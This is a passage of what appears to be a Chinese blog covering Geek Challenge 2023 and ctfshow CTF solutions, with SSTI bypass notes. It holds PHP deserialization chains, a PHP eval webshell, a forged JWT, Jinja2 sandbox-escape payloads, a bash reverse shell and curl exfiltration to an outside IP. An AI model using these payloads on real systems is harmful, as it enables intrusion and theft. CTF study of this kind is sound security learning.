echo ('&lt;br&gt;'); if(basename($_SERVER[$a])==='key.php'){ echo(&quot;找到了！但好像不能直接使用，怎么办，我好想她&lt;br&gt;&quot;); $file = &quot;key.php&quot;; readfile($file); } } else{ echo(&quot;你别这样，她会生气的┭┮﹏┭┮&quot;); } } } else{ echo(&quot;就这点能耐？怎么帮我找到她(╥╯^╰╥)&lt;br&gt;&quot;); } } } public function __get($good) { echo &quot;you are good,你快找到我爱的那个她了&lt;br&gt;&quot;; $zhui = $this-&gt;$good; $zhui[$good](); }}if (isset($_GET['user'])) { $user = $_GET['user']; if (!preg_match(&quot;/^[Oa]:[\\d]+/i&quot;, $user)) { unserialize($user); } else { echo(&quot;不是吧，第一层都绕不过去？？？&lt;br&gt;&quot;); }}else { echo(&quot;快帮我找找她！&lt;br&gt;&quot;);}?&gt; 虽然代码看起来比较长，但是还是比较好分析的，pop链也很容易看出来。需要用到两次pop链，第一条用来得到key.php的内容，第二次才是得到flag 123unserialize -&gt; useless(__destruct) -&gt; useless(readfile)unserialize -&gt; Me(__wakeup) -&gt;her(__invoke) -&gt;important(__sleep) -&gt;useless(__get) -&gt;her(find) /^[Oa]:[\\d]+/i第一次遇到这种情况，单独拿出来讲一下： 挺早之前我就知道使用C代替O能绕过wakeup，但那样的话只能执行construct()函数或者destruct()函数，无法添加任何内容，这次比赛学到了种新方法，就是把正常的反序列化进行一次打包，让最后生成的payload以C开头即可 12345678910111213141516171819202122&lt;?phperror_reporting(0);highlight_file(__FILE__);class ctfshow{ public function __wakeup(){ die(&quot;not allowed!&quot;); } public function __destruct(){ system($this-&gt;ctfshow); }}$data = $_GET['1+1&gt;2'];if(!preg_match(&quot;/^[Oa]:[\\d]+/i&quot;, $data)){ unserialize($data);}?&gt; 不能直接将字母O改成字母C,这里我们可以使用ArrayObject对正常的反序列化进行一次包装，让最后输出的payload以C开头 12345678910111213141516171819202122232425&lt;?phpclass ctfshow { public $ctfshow; public function __wakeup(){ die(&quot;not allowed!&quot;); } public function __destruct(){ echo &quot;OK&quot;; system($this-&gt;ctfshow); } }$a=new ctfshow;$a-&gt;ctfshow=&quot;whoami&quot;;$arr=array(&quot;evil&quot;=&gt;$a);$oa=new ArrayObject($arr);$res=serialize($oa);echo $res;//unserialize($res)?&gt;#C:11:&quot;ArrayObject&quot;:77:{x:i:0;a:1:{s:4:&quot;evil&quot;;O:7:&quot;ctfshow&quot;:1:{s:7:&quot;ctfshow&quot;;s:6:&quot;whoami&quot;;}};m:a:0:{}} 7.3.4才可以输出以C开头的payload，换7.4或者8.0输出的就是O开头了，除了这个函数还有其他方法可以对payload进行包装 实现了unserialize接口的大概率是C打头，经过所有测试发现可以用的类为： ArrayObject::unserialize ArrayIterator::unserialize RecursiveArrayIterator::unserialize SplObjectStorage::unserialize 参考 pop_onestr_shuffle：随机地打乱字符串中的所有字符 用原生类绕过md5,and的优先级要低于=，basename用ascii编码大于127绕过，$_SERVER是一个数组，可以自己打印看看 12345678910111213141516&lt;?phpclass useless{ public $QW; public $YXX;} $cmd=&quot;1&quot;;$a = new Exception($cmd);$b = new Exception($cmd,1);$tr = new useless();$tr-&gt;QW=$a;$tr-&gt;YXX=$b;$arr=array(&quot;evil&quot;=&gt;$tr);$oa=new ArrayObject($arr);echo urlencode(serialize(($oa)));#https://x64n15yejrv1auhzo7nkm4zct.node.game.sycsec.com/havefun.php/key.php/%ff?user=C%3A11%3A%22ArrayObject%22%3A473%3A%7Bx%3Ai%3A0%3Ba%3A1%3A%7Bs%3A4%3A%22evil%22%3BO%3A7%3A%22useless%22%3A2%3A%7Bs%3A2%3A%22QW%22%3BO%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A1%3A%221%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A8%3A%22E%3A%5Ca.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A9%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7Ds%3A3%3A%22YXX%22%3BO%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A1%3A%221%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A1%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A8%3A%22E%3A%5Ca.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A9%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D%7D%7D%3Bm%3Aa%3A0%3A%7B%7D%7D&amp;a=PHP_SELF 最终得到一段加密的数据，太长了我就不贴了，将数据base64解密保存成图片,得到key和hername cyberchef pop_two12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;?phpclass Me { public $qwe; public $bro; public $secret;}class her{ public $hername; public $key; public $asd;}class important{ public $power;}class useless { public $seeyou ; public $QW; public $YXX;}$a = new Me();$a-&gt;bro = &amp;$a-&gt;secret;$b = new her();$a-&gt;qwe = $b;$c = new important();$d = new useless('deadbeef');// $d-&gt;good=array(&quot;seeyou&quot;=&gt;&quot;phpinfo&quot;) ;$cc = new her();$cc-&gt;key=9;$cc-&gt;hername=&quot;momo&quot;;$method = [$cc, 'find'];$d-&gt;seeyou= array(&quot;seeyou&quot;=&gt;$method) ;$c-&gt;power = $d;$b -&gt;asd = $c;$arr=array(&quot;evil&quot;=&gt;$a);$oa=new ArrayObject($arr);echo (serialize(($oa)));?&gt; #C:11:&quot;ArrayObject&quot;:345:{x:i:0;a:1:{s:4:&quot;evil&quot;;O:2:&quot;Me&quot;:3:{s:3:&quot;qwe&quot;;O:3:&quot;her&quot;:3:{s:7:&quot;hername&quot;;N;s:3:&quot;key&quot;;N;s:3:&quot;asd&quot;;O:9:&quot;important&quot;:1:{s:5:&quot;power&quot;;O:7:&quot;useless&quot;:4:{s:6:&quot;seeyou&quot;;a:1:{s:6:&quot;seeyou&quot;;a:2:{i:0;O:3:&quot;her&quot;:3:{s:7:&quot;hername&quot;;s:4:&quot;momo&quot;;s:3:&quot;key&quot;;i:9;s:3:&quot;asd&quot;;N;}i:1;s:4:&quot;find&quot;;}}s:2:&quot;QW&quot;;N;s:3:&quot;YXX&quot;;N;s:4:&quot;good&quot;;N;}}}s:3:&quot;bro&quot;;N;s:6:&quot;secret&quot;;R:20;}};m:a:0:{}} 这条pop链踩了坑，第一就是，对象里只写属性值，不要再写其他的不然会有影响； __sleep: 该函数必须返回一个需要进行序列化保存的成员属性数组 //并且只序列化该函数返回的这些成员属性 __get: 获得一个类中不可访问的成员变量时(未定义或私有属性) 在PHP中，你可以使用可调用的数组来将对象的方法赋值给变量。这可以通过将对象和方法名作为数组的元素来实现。以下是一个示例： 12345678910111213class MyClass { public function myMethod() { echo &quot;Hello, world!&quot;; }}$obj = new MyClass();$func = [$obj, 'myMethod'];// 现在 $func 变量包含了 MyClass 对象的 myMethod 方法// 调用该方法$func(); 这条链有意思，使得将her对象的find函数赋值给useless对象的seeyou变量，然后$good不用管，$good为空，会执行$this-&gt;good().$this-&gt;good是由important对象传过来的seeyou,而seeyou已经被赋值为了her对象的find函数，就会去执行find函数， 再用data协议绕过， 1file=data:text/plain;base64,bG92ZXlvdQ== 再用原生类绕过，这道题用了两次php原生类。 GlobIterator得到flag的文件名和路径.SplFileObject读文件，只能读取文件的第一行内容，配合php://filter拿到文件所有内容 1234567GET :fun=./f*POST: ctf=GlobIterator#flag_my_baby.phpGET:fun=php://filter/read=convert.base64-encode/resource=flag_my_baby.phpPOST :ctf=SplFileObject Akane!source code12345678910111213141516171819202122232425262728293031323334353637&lt;?phperror_reporting(0);show_source(__FILE__);class Hoshino{ public $Ruby; private $Aquamarine; public function __destruct() { $this-&gt;Ruby-&gt;func(); }}class Idol{ public $Akane; public function __wakeup() { $this-&gt;Akane = '/var/www/html/The************************.php'; } public function __call($method,$args) { $Kana = count(scandir($this-&gt;Akane)); if ($Kana &gt; 0) { die('Kurokawa Akane'); } else { die('Arima Kana'); } }}$a = unserialize(base64_decode($_GET['tuizi']));?&gt; 考的序列化，pop链也足够明显 :, 1Hoshino(__destruct) -&gt; Idol(__call) 但是没有找到任何可以命令执行的地方，然后我就去dirsearch ，也没有任何东西； 再仔细分析源码，pop链肯定是固定的这一点不用想，分析分析__call到底在干什么？ scandir列出 $this-&gt;Akane 目录中的文件和目录,返回的是一个数组 count 返回数组中元素的数目 glob:// — 查找匹配的文件路径模式 Example12345678&lt;?phperror_reporting(0);highlight_file(__FILE__);echo &quot;&lt;/br&gt;&quot;;echo count(scandir($_GET['file']));echo &quot;&lt;/br&gt;&quot;;var_dump(scandir($_GET['file']))?&gt; 12345http://127.0.0.1/test002.php?file=glob://f*#输出如下：2array(2) { [0]=&gt; string(4) &quot;flag&quot; [1]=&gt; string(8) &quot;flag.php&quot; } exp12345678910111213141516171819202122232425262728293031323334353637383940414243import requestsimport base64base_url =&quot;https://jn5lthd6e8wksjfi6mpuosppa.node.game.sycsec.com/?tuizi=&quot;str = &quot;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz&quot;def base64_encode(string): # 将字符串编码为 bytes 对象 string_bytes = string.encode('utf-8') # 使用 base64 模块进行编码 encoded_bytes = base64.b64encode(string_bytes) # 将编码后的 bytes 对象转换为字符串 encoded_string = encoded_bytes.decode('utf-8') return encoded_stringzifu = &quot;&quot;for i in range(100): k = i+30 data = f'O:7:&quot;Hoshino&quot;:2:{{s:4:&quot;Ruby&quot;;O:4:&quot;Idol&quot;:1:{{s:5:&quot;Akane&quot;;s:{k}:&quot;glob:///var/www/html/The*.php&quot;;}}s:19:&quot;HoshinoAquamarine&quot;;N;}}' zz = &quot;glob:///var/www/html/The&quot; +zifu +&quot;*.php&quot; if (len(zz) != k-1): break for j in range(len(str)): insert_string = zifu+str[j] print(zifu) start_index = data.find(&quot;The&quot;+zifu) insert_index = data.find(&quot;*.php&quot;) if insert_index != -1: # 在找到的位置之前插入字符串 modified_string = data[:insert_index] + insert_string + data[insert_index:] base_data = base64_encode(modified_string) url= base_url+base_data res = requests.get(url=url) if (len(res.text) ==4120): print(&quot;success&quot;) zifu=zifu +str[j] print(zifu) #print(url) break else: print(&quot;未找到插入位置&quot;)print(&quot;字符:&quot;+zifu)#字符:S4crEtF1AgFi1EByo2takuXX 访问TheS4crEtF1AgFi1EByo2takuXX.php得到flag klf_3source code再比赛中是看不到源码的，是我后来可以rce后，cat app.py得到源码的，为了方便写wp，就贴一下 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677import reimport osapp = Flask(__name__)@app.route('/', methods=['GET', 'POST'])def index(): return render_template('index.html')@app.route('/secr3ttt', methods=['GET', 'POST'])def secr3t(): name = request.args.get('klf', '') template = f''' &lt;html&gt; &lt;body&gt; &lt;h1&gt;找到secr3t了，但是找不到flag你还是个klf&lt;/h1&gt; &lt;h1&gt;%s&lt;/h1&gt; &lt;/body&gt; &lt;/html&gt; &lt;img src=\\&quot;https://image-obsidian-1317327960.cos.ap-chengdu.myqcloud.com/obisidian-blog/8.jpg\\&quot; alt=&quot;g&quot;&gt; &lt;!--klf?--&gt; &lt;!-- klf还想要flag？没那么容易 --&gt; ''' bl = ['_', '\\\\', '\\'', '&quot;', 'request', &quot;+&quot;, 'class', 'init', 'arg', 'config', 'app', 'self', 'cd', 'chr', 'request', 'url', 'builtins', 'globals', 'base', 'pop', 'import', 'popen', 'getitem', 'subclasses', '/', 'flashed', 'os', 'open', 'read', 'count', '*', '43', '45', '38', '124', '47', '59', '99', '100', 'cat', '~', ':', 'not', '0', 'length', 'index', '-', 'ord', '37', '94', '96', '48', '49', '50', '51', '52', '53', '54', '55', '56', '57', '58', '59', '[', ']', '@', '^', '#'] for i in bl: if i in name: return render_template('klf.html') #return &quot;真是klf！！！回去多学学啦&quot; pattern = r&quot;\\s*\\)\\s*\\)&quot; match = re.search(pattern, name) pattern2 = r&quot;\\s*\\)\\s*(,)?\\s*\\)&quot; match2 = re.search(pattern2, name) pattern3 = r&quot;\\s*\\)\\s*\\)\\s*\\|&quot; match3 = re.search(pattern3, name) pattern4 = r&quot;\\s*,\\s*\\)\\s*\\)\\s*\\|&quot; match4 = re.search(pattern4, name) pattern_mo = r&quot;\\d+\\s*%\\s*\\d+|[a-zA-Z]+\\s*%\\s*[a-zA-Z]+&quot; matche_mo = re.search(pattern_mo, name) if match: if match2.group(1): return render_template('klf.html') elif match4: return render_template('klf.html') elif match3: return render_template_string(template % name) else: return render_template('klf.html') # 输出匹配的结果 if matche_mo : return render_template('klf.html') a=render_template_string(template % name) if &quot;{&quot; in a: return a + render_template('win.html') return a@app.route('/robots.txt', methods=['GET'])def robots(): return send_from_directory(os.path.join(app.root_path, 'static'), 'robots.txt', mimetype='text/plain')if __name__ == '__main__': app.run(host='0.0.0.0', port=7888, debug=False) 还是可以用klf_2的解法解决,不可以用“))”，只需要从klf_2的exp改一下就好了，也是侥幸拿了一个一血 poc12345678910111213141516171819202122232425262728{% set po=dict(po=a,p=b)|join%} {% set a=(()|select|string|list)|attr(po)(24)%}{% set ini=(a,a,dict(in=a,it=b)|join,a,a)|join()%}{% set glo=(a,a,dict(glo=a,bals=b)|join,a,a)|join()%}{% set cls=(a,a,dict(cla=a,ss=b)|join,a,a)|join()%}{% set bs=(a,a,dict(bas=a,e=b)|join,a,a)|join()%}{% set geti=(a,a,dict(get=a)|join,dict(item=a)|join,a,a)|join()%}{% set subc=(a,a,dict(subcla=a,sses=b)|join,a,a)|join()%}{% set pp=dict(po=a,pen=b)|join %}{% set re=dict(re=a,ad=b)|join%}{% set kon=(()|select|string|list)|attr(po)(17)%} {% set dian=(g|string|list)|attr(po)(6)%} {% set qian=dict(p=a)|join%}{% set hou=dict(p=a,y=b)|join%}{% set ming=(kon,kon,dict(ap=a,p=b)|join,dian,hou)|join()%}{% set cmd=(dict(ca=a,t=b)|join,ming)|join()%}{% set a=()|attr(cls)|attr(bs)|attr(subc)()|attr(geti)(117)|attr(ini)|attr(glo)|attr(geti)(pp)(cmd)|attr(re)()%}{% set bb=(a|string|list)|attr(po)(246)%}{% set ho=(dict(ap=a,p=b))|join%}{% set fl=(dict(fl4gfl4g=a,fl4g=b))|join%}{% set cmd=(dict(ca=a,t=b)|join,kon,bb,ho,bb,fl)|join%}{% set res =()|attr(cls)|attr(bs)|attr(subc)()|attr(geti)(117)|attr(ini)|attr(glo)|attr(geti)(pp)(cmd)|attr(re)()%}{% print(res) %} famale_imp_l0ve只能上传zip文件，而且存在一处文件包含，限制了后缀必须为.jpg;这题的php环境是5.6；\\x00的截断在php&gt;5.3.4就没用了 123456789&lt;?php//o2takuXX师傅说有问题，忘看了。header('Content-Type: text/html; charset=utf-8');highlight_file(__FILE__);$file = $_GET['file'];if(isset($file) &amp;&amp; strtolower(substr($file, -4)) == &quot;.jpg&quot;){ include($file);}?&gt; 在php中 zip://test.zip#1.png是什么意思? 在PHP中，zip://test.zip#1.png是一种URL封装协议，它允许你像访问本地文件一样访问ZIP存档中的文件。在这个例子中，zip://表示使用ZIP协议，test.zip是ZIP存档的文件名，#1.png表示存档中的文件路径。因此，zip://test.zip#1.png意味着你正在引用test.zip存档中的1.png文件。 新建一个文件 1.jpg图片内容即可为需要执行的命令，如&lt;?php eval($_POST[1]); ?&gt;打包成zip即include.php?file=zip://upload/3.zip%231.jpg change_itsource code1234 &lt;!--用户名为：user密码也为：user--&gt; 登陆之后没有权限上传文件，查看cookie是一段jwt加密，没什么好说的直接用工具跑出key 12key : &quot;yibao&quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJRaW5nd2FuIiwibmFtZSI6ImFkbWluIiwiYWRtaW4iOiJ0cnVlIn0.qs6tjnaghMXiTsvqEMUauz_JGzxxKdtaXPGVtQUEHek 现在有权限上传任意文件了，但是只知道文件上传在upload下，不知道文件名，查看源代码 123456789101112function php_mt_seed($seed) { mt_srand($seed); } $seed = time(); php_mt_seed($seed); $characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'; $newFileName = ''; for ($i = 0; $i &lt; 10; $i++) { $newFileName .= $characters[mt_rand(0, strlen($characters) - 1)]; } 这代码很明显了，只要知道time的时间戳，既可以知道文件名， poc解释一下我的脚本:设置一个十秒的时间戳，在这十秒之内上传一个文件必定可以中一个文件的时间戳 123456789101112131415161718&lt;?php highlight_file(__FILE__);function php_mt_seed($seed){ mt_srand($seed);}for ($j = 0; $j &lt; 10; $j++){ $seed = time(); php_mt_seed($seed); sleep(1); echo $seed.&quot;: &quot;; $characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'; $newFileName = ''; for ($i = 0; $i &lt; 10; $i++) { $newFileName .= $characters[mt_rand(0, strlen($characters) - 1)]; } echo $newFileName.&quot;&lt;/br&gt;&quot;;} 运行这个脚本，在十秒之内上传一个木马文件即可，然后脚本会根据十个时间戳输出十个文件名，其中必定会中一个文件名 flag保卫战(待复现)ezrfi(待复现)scan_tool(待复现)ez_sql(待复现)EZ_Smuggling(待复现)java(待复现)","link":"/2023/11/26/Geek%20Challenge%202023/"},{"title":"SSTI漏洞","text":"ssti常用命令12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455__class__ 类的一个内置属性，表示实例对象的类。__base__ 类型对象的直接基类__bases__ 类型对象的全部基类（除object），以元组形式，类型的实例通常没有属性。 __bases____mro__ 此属性是由类组成的元组，在方法解析期间会基于它来查找基类。__subclasses__() 返回这个类的所有子类集合，Each class keeps a list of weak references to its immediate subclasses. This method returns a list of all those references still alive. The list is in definition order.__init__ 初始化类，返回的类型是function__globals__ 使用方式是 函数名.__globals__获取function所处空间下可使用的module、方法以及所有变量。__dic__ 类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__里__getattribute__() 实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行.操作的时候（形如：a.xxx/a.xxx()），都会自动去调用__getattribute__方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。__getitem__() 调用字典中的键值，其实就是调用这个魔术方法，比如a['b']，就是a.__getitem__('b')__builtins__ 内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身。即里面有很多常用的函数。__builtins__与__builtin__的区别就不放了，百度都有。__import__ 动态加载类和函数，也就是导入模块，经常用于导入os模块，__import__('os').popen('ls').read()]__str__() 返回描写这个对象的字符串，可以理解成就是打印出来。url_for flask的一个方法，可以调用当前脚本中的函数，可以用于得到__builtins__，而且url_for.__globals__['__builtins__']含有current_app。get_flashed_messages flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__['__builtins__']含有current_app。lipsum flask的一个方法，可以用于得到__builtins__，而且lipsum.__globals__含有os模块：{{lipsum.__globals__.os.popen('ls').read()}}current_app 应用上下文，一个全局变量。request 可以用于获取字符串来绕过，包括下面这些，引用一下羽师傅的。此外，同样可以获取open函数:request.__init__.__globals__['__builtins__'].open('/proc\\self\\fd/3').read()request.args.x1 get传参request.values.x1 所有参数request.cookies cookies参数request.headers 请求头参数request.form.x1 post传参 (Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)request.data post传参 (Content-Type:a/b)request.json post传json (Content-Type: application/json)config 当前application的所有配置。此外，也可以这样{{ config.__class__.__init__.__globals__['os'].popen('ls').read() }}self.__dict__ 保存当前类实例或对象实例的属性变量键值对字典，{%print(&quot;DMIND&quot;)%} 控制语句中也能输出拼接字符：{% set ind=dict(ind=a,ex=a)|join%} 变量ind=index获取字符：{{lipsum|string|list|attr('pop')(18)}} 相当于：lipsum|string|list|attr('pop')(18) 输出：_（下划线）得到数字：{{lipsum|string|list|attr('index')('g')}} 相当于lipsum|string|list|attr('index')('g') 输出：10运算出其他数字：{% set shiba=ten%2bten-two %} %2b是URL编码后的加号得到数字：{{dict(a=a)|lower|list|count}}得到16运算出其他数字：{{dict(aa=a)|lower|list|count-dict(a=a)|lower|list|count}}得到1得到任意字符：{{dict(dmind=a)|slice(1)|first|first}}得到dmind获取__builtins__属性：{{lipsum.__globals__|attr('get')('__builtins__')}} 利用get()、pop()获取属性，相当于lipsum.__globals__.get('__builtins__')lipsum.__globals__.__builtins__ 相当于 lipsum|attr('__globals__')|attr('get')('__builtins__')lipsum.__globals__.__builtins__.chr(95) 相当于 lipsum|attr('__globals__')|attr('get')('__builtins__')|attr('get')('chr')(95)得到chr函数：{%set chr=lipsum.__globals__.__builtins__.chr%}利用chr()得到字符：{{chr(47)~chr(32)}} 47是/ 32是空格 ~是连接符利用os执行命令：lipsum.__globals__.os.popen('dir').read() 相当于 lipsum|attr('__globals__')|attr('get')('os')|attr('popen')('dir')|attr('read')()类似的 url_for['__globals__']['os']['popen']('dir').read()简单的读取文件：url_for[&quot;__globa&quot;+&quot;ls__&quot;].__builtins__.open(&quot;flag.txt&quot;).read()在能执行eval情况下：eval(__import__('so'[::-1]).__getattribute__('syste'%2b'm')('curl http://xxx:4567?p=`cat /f*`')) ssti常用过滤器123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960attr(): attr用于获取变量(过滤器与变量之间用管道符号（|）隔开，括号中可以有可选参数。可以链接多个过滤器。一个过滤器的输出应用于下一个过滤器) &quot;&quot;|attr(&quot;__class__&quot;) 相当于 &quot;&quot;.__class__ dict(po=ll,p=abc)|join ：连接键名，拼接得到popint()：将值转换为int类型；float()：将值转换为float类型；lower()：将字符串转换为小写；upper()：将字符串转换为大写；title()：把值中的每个单词的首字母都转成大写；capitalize()：把变量值的首字母转成大写，其余字母转小写；trim()：截取字符串前面和后面的空白字符；wordcount()：计算一个长字符串中单词的个数；reverse()：字符串反转；replace(value,old,new)： 替换将old替换为new的字符串；truncate(value,length=255,killwords=False)：截取length长度的字符串；striptags()：删除字符串中所有的HTML标签，如果出现多个空格，将替换成一个空格；escape()或e：转义字符，会将&lt;、&gt;等符号转义成HTML中的符号。显例：content|escape或content|e。safe()： 禁用HTML转义，如果开启了全局转义，那么safe过滤器会将变量关掉转义。示例： {{'&lt;em&gt;hello&lt;/em&gt;'|safe}}；list()：将变量列成列表；string()：将变量转换成字符串；join()：将一个序列中的参数值拼接成字符串。示例看上面payload；abs()：返回一个数值的绝对值；first()：返回一个序列的第一个元素；last()：返回一个序列的最后一个元素；format(value,arags,*kwargs)：格式化字符串。比如：{{ &quot;%s&quot; - &quot;%s&quot;|format('Hello?',&quot;Foo!&quot;) }}将输出：Helloo? - Foo!length()：返回一个序列或者字典的长度；sum()：返回列表内数值的和；sort()：返回排序后的列表；default(value,default_value,boolean=false)：如果当前变量没有值，则会使用参数中的值来代替。示例：name|default('xiaotuo')----如果name不存在，则会使用xiaotuo来替代。boolean=False默认是在只有这个变量为undefined的时候才会使用default中的值，如果想使用python的形式判断是否为false，则可以传递boolean=true。也可以使用or来替换。length()返回字符串的长度，别名是count ssti_fuzzweb361_(入门ssti)啥都没有过滤,所以可以用很多方法 1234567{{url_for.__globals__.os.popen('cat /flag').read()}}{{url_for.__globals__['__builtins__']['eval'](&quot;__import__('os').popen('cat /flag').read()&quot;)}}{{&quot;&quot;.__class__.__base__.__subclasses__()[132].__init__.__globals__['popen']('cat /flag').read()}}{{().__class__.__base__.__subclasses__()[].__init__.__globals__['__builtins__']['eval']('__import__(&quot;os&quot;).popen(&quot;cat /flag&quot;).read()')}} 123456789101112import requestsurl_base = &quot;http://26ecb42c-4859-430a-8b81-7476a70fba72.challenge.ctf.show?name=&quot;for i in range(500): url = url_base +&quot;{{''.__class__.__base__.__subclasses__()[&quot;+str(i)+&quot;]}}&quot; response = requests.get(url=url) if response.status_code == 200: if 'os._wrap_close' in response.text: print(i) break print(i) 1{{().__class__.__base__.__subclasses__()[].__init__.__globals__['__builtins__']['eval']('__import__(\\&quot;os\\&quot;).popen(&quot;bash -c \\'bash -i &gt;&amp; /dev/tcp/81.71.13.76/5050 0&gt;&amp;1\\'&quot;).read()')}} web362_(数字)可以用全角绕过过滤的数字，也可以使用不用数字的payload 1{{&quot;&quot;.__class__.__base__.__subclasses__()[１３２].__init__.__globals__['popen']('cat /flag').read()}} web363_(‘ “)利用requst.arg绕过 1{{().__class__.__mro__[-1].__subclasses__()[132].__init__.__globals__[request.args.popen](request.args.cmd).read()}}&amp;popen=popen&amp;cmd=cat /flag web364_(‘ “ args)利用request.cookie绕过 123{{().__class__.__mro__[-1].__subclasses__()[132].__init__.__globals__[request.cookies.popen](request.cookies.cmd).read()}}Cookie:popen=popen;cmd=cat /flag web365_([ ])增加过滤了**[ ]**,可以用__getitem()__绕过 123456789().__class__.__mro__.__getitem__(-1){{().__class__.__mro__.__getitem__(-1).__subclasses__().__getitem__(132).__init__.__globals__.__getitem__(request.cookies.popen)(request.cookies.cmd).read()}} Cookie:cmd=cat /flag;popen=popen============================================================={{url_for.__globals__.os.popen(request.cookies.cmd).read()}}Cookie:cmd=cat /flag web366_(下划线)利用attr过滤器绕过 1234{{lipsum.__globals__.os.popen('ls').read()}}{{(lipsum|attr(request.cookies.globals)).os.popen(reqeuest.cookies.cmd).read()}}Cookie:cmd=cat /flag;globals=__globals__ web367_(os)过滤了字符os，那就把os写到request里面就行了 12345x.__init__.__globals__['__builtins__'].eval(&quot;__import__('os').popen('ls /').read()&quot;){{(x|attr(request.cookies.init)|attr(request.cookies.globals)|attr(request.cookies.getitem))(request.cookies.builtins).eval(request.cookies.cmd)}}Cookie:init=__init__;globals=__globals__;getitem=__getitem__;builtins=__builtins__;cmd=__import__('os').popen('cat /flag').read() web368_(大括号)过滤了{{,}},可以用{% %} 使用request.values.x，values可以接受GET和POST形式的传参,注意get(request.values.b)中的get根据你的传参方式来的 1234{% print(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read() %}&amp;a=__globals__&amp;b=os&amp;c=cat /flag web369_(request)过滤了request,利用dict()|join拼接我们需要的字符 12345678910{% set po=dict(po=a,p=a)|join%} # dict()|join 拼接键名的方式，此处得到变量po=pop{% set a=(()|select|string|list)|attr(po)(24)%} #通过pop(24)选择到“_”下划线并赋值给a{% set ini=(a,a,dict(init=a)|join,a,a)|join()%} #ini=__init__{% set glo=(a,a,dict(globals=a)|join,a,a)|join()%} #glo=__globals__{% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%} #geti=__getitem__{% set built=(a,a,dict(builtins=a)|join,a,a)|join()%} #built=__builtins__{% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%} #x=q.__init__.__globals__.__getitem__('__builtins__'){% set chr=x.chr%} #chr=x.chr 选择到了chr函数，chr=&lt;built-in function chr&gt;{% set file=chr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%} #结合ASCII和chr函数构造。file=/flag{%print(x.open(file).read())%} #利用open函数读取 web370_(0-9)将上一题的数字用全角替换 12345678910{% set po=dict(po=a,p=a)|join%} {% set a=(()|select|string|list)|attr(po)(２４)%} {% set ini=(a,a,dict(init=a)|join,a,a)|join()%} {% set glo=(a,a,dict(globals=a)|join,a,a)|join()%}{% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%}{% set built=(a,a,dict(builtins=a)|join,a,a)|join()%}{% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%}{% set chr=x.chr%} {% set file=chr(４７)%2bchr(１０２)%2bchr(１０８)%2bchr(９７)%2bchr(１０３)%}{%print(x.open(file).read())%} 也可以用count或者length 123456789101112131415{% set two=(dict(aa=a)|join|count)%}{% set three=(dict(aaa=a)|join|count)%}{% set four=(dict(aaaa=a)|join|count)%}{% set seven=(dict(aaaaaaa=a)|join|count)%}{% set eight=(dict(aaaaaaaa=a)|join|count)%}{% set nine=(dict(aaaaaaaaa=a)|join|count)%}{% set ten=(dict(aaaaaaaaaa=a)|join|count)%}{% set twofour=( two~four)|int%}{% set a=(()|select|string|list).pop(twofour)%}{% set globals=(a,a,dict(globals=s)|join,a,a)|join%}{% set init=(a,a,dict(init=v)|join,a,a)|join%}{% set builtins=(a,a,dict(builtins=c)|join,a,a)|join%}{% set a=(lipsum|attr(globals)).get(builtins)%}{% set chr=a.chr%}{% print a.open(chr((four~seven)|int)~chr((ten~two)|int)~chr((ten~eight)|int)~chr((nine~seven)|int)~chr((ten~three)|int)).read()%} web371_(print)过滤了print，将flag内容发送到vps 1234567891011s='__import__(&quot;os&quot;).popen(&quot;curl http://81.71.13.76:5555?p=`cat /flag`&quot;).read()'def fun(s): t='' for i in range(len(s)): if i&lt;len(s)-1: t+='chr('+(str(ord(s[i])))+')%2b' else: t+='chr('+(str(ord(s[i])))+')' return tprint(fun(s))#再将数字转成全角 1234567891011121314{% set po=dict(po=a,p=a)|join%} {% set a=(()|select|string|list)|attr(po)(２４)%} {% set ini=(a,a,dict(init=a)|join,a,a)|join()%} {% set glo=(a,a,dict(globals=a)|join,a,a)|join()%}{% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%}{% set built=(a,a,dict(builtins=a)|join,a,a)|join()%}{% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%}{% set chr=x.chr%}{% set 